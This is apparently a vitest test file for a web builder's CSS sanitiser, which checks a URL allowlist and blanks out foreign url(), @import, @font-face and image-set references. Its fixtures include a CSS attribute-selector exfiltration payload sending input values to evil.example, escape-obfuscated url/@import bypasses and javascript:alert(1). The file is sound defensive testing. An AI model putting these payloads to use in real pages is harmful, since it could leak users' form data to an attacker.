import { describe, it, expect } from "vitest";
import { blockForeignCssUrls, isCanvasCssUrlAllowed } from "../canvasCssUrls";
import { isElementOwnSelector } from "../elementSelector";

const ORIGIN = "https://app.buildrick.io";
const clean = (css: string) => blockForeignCssUrls(css, ORIGIN);

describe("isCanvasCssUrlAllowed", () => {
  it.each([
    "/images/a.png",
    "a.png",
    "#filter",
    "https://app.buildrick.io/api/x",
    "data:image/png;base64,AAAA",
    "blob:https://app.buildrick.io/uuid",
    "https://abc123.public.blob.vercel-storage.com/u/1/a.webp",
    "https://images.unsplash.com/photo-1",
    "https://images.pexels.com/photos/1/a.jpg",
    "https://fonts.googleapis.com/css2?family=Inter",
    "https://fonts.gstatic.com/s/inter/v1/a.woff2",
    "https://fonts.bunny.net/css?family=inter",
    "",
  ])("allows %s", (url) => {
    expect(isCanvasCssUrlAllowed(url, ORIGIN)).toBe(true);
  });

  it.each([
    "https://evil.example/x",
    "//evil.example/x",
    // CSS `\\` is a literal backslash, which the URL parser reads as `/`.
    "/\\\\evil.example/x",
    "http://fonts.gstatic.com/a.woff2",
    "https://public.blob.vercel-storage.com.evil.example/a",
    "https://evil.example/?https://images.unsplash.com",
    "https://ev\\69l.example/x",
    "javascript:alert(1)",
  ])("refuses %s", (url) => {
    expect(isCanvasCssUrlAllowed(url, ORIGIN)).toBe(false);
  });
});

describe("blockForeignCssUrls", () => {
  it("neutralises the attribute-selector exfiltration shape", () => {
    const css = 'input[value^="a"] { background: url("https://evil.example/leak?a") }';
    expect(clean(css)).toBe('input[value^="a"] { background: url("data:,") }');
  });

  it("handles unquoted, single-quoted and upper-case url()", () => {
    expect(clean("a{b:url(https://evil.example/1)}")).toBe("a{b:url(data:,)}");
    expect(clean("a{b:URL( 'https://evil.example/2' )}")).toBe(`a{b:URL( "data:," )}`);
  });

  it("keeps allowed references byte-for-byte", () => {
    const css = [
      "@import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');",
      ".hero{background-image:url(https://images.unsplash.com/photo-1?w=1600)}",
      "@font-face{font-family:X;src:url(\"https://abc.public.blob.vercel-storage.com/u/1/x.woff2\") format('woff2')}",
      ".icon{mask:url(data:image/svg+xml;utf8,%3Csvg%3E%3C/svg%3E)}",
      ".rel{background:url(/img/a.png)}",
      ':root{--brand:#1A56DB} .q::before{content:"\\201C"}',
    ].join("\n");
    expect(clean(css)).toBe(css);
  });

  it("blocks a foreign @import in both forms", () => {
    expect(clean('@import "https://evil.example/a.css";')).toBe('@import "data:,";');
    expect(clean("@import url(https://evil.example/a.css) screen;")).toBe("@import url(data:,) screen;");
  });

  it("blocks foreign @font-face sources", () => {
    expect(clean("@font-face{font-family:x;src:url(https://evil.example/f.woff2)}")).toBe(
      "@font-face{font-family:x;src:url(data:,)}"
    );
  });

  it("blocks bare strings in image-set(), -webkit-image-set() and src()", () => {
    expect(clean('a{background:image-set("https://evil.example/1x.png" 1x, "/ok.png" 2x)}')).toBe(
      'a{background:image-set("data:," 1x, "/ok.png" 2x)}'
    );
    expect(clean('a{background:-webkit-image-set("https://evil.example/a.png" 1x)}')).toBe(
      'a{background:-webkit-image-set("data:," 1x)}'
    );
    expect(clean('a{background:src("https://evil.example/a.png")}')).toBe('a{background:src("data:,")}');
  });

  it("leaves strings outside fetching functions alone", () => {
    const css = 'a::after{content:"https://evil.example/not-a-request"} b{font-family:"Inter"}';
    expect(clean(css)).toBe(css);
  });

  it("blocks a url() with a comment or modifier after its string", () => {
    expect(clean('a{b:url("https://evil.example/x" /* c */)}')).toBe('a{b:url("data:," /* c */)}');
  });

  it("drops the whole stylesheet when an escape spells a foreign reference", () => {
    expect(clean("a{b:\\75 rl(https://evil.example/x)} c{color:red}")).toBe("");
    expect(clean("a{b:u\\72l(https://evil.example/x)}")).toBe("");
    expect(clean('@\\69mport "https://evil.example/a.css";')).toBe("");
  });

  it("returns empty input unchanged", () => {
    expect(clean("")).toBe("");
  });
});

describe("isElementOwnSelector", () => {
  it.each(['[data-buildrick-id="el-1"]', '[data-buildrick-id="el-1"]:hover', '[data-buildrick-id="a_b"]::before'])(
    "%s is an element's own selector",
    (selector) => expect(isElementOwnSelector(selector)).toBe(true)
  );

  it.each([
    ".hero",
    'input[value^="a"]',
    '[data-buildrick-id="el-1"] input',
    '[data-buildrick-id="el-1"], input',
    '[data-buildrick-id="el-1"]:nth-child(2)',
    "body",
  ])("%s is not", (selector) => expect(isElementOwnSelector(selector)).toBe(false));
});
